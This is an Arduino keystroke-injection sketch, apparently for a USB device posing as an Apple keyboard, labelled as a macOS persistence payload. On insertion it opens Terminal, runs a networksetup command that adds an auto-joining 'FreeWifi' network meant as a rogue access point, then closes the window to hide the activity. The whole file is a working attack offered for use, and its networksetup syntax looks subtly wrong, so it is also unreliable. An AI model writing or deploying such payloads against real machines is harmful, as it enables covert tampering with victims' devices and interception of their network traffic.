#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Create auto-connect profile for rogue AP
  // NOTE: Requires airport utility or networksetup
  // Author: Generated
  // Title: WiFi Auto-Connect Rogue AP
  // Target: macOS
  // Version: 1.0
  // Category: Persistence
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("networksetup -addWiFiNetwork \"FreeWifi\" WPA2 \"password123\" autojoin");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo 'Rogue AP profile added'");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}